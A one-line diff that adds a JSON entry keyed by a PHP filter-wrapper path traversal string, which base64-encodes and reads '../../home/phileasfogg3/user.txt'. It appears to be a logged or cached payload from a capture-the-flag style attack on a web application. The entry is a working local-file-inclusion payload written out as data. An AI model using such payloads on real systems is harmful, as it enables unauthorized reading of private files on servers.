@@ -1,0 +1,1 @@
+{"php:\/\/filter\/convert.base64-encode\/resource=..\/..\/..\/..\/..\/..\/home\/phileasfogg3\/user.txt":{"any":[]}}
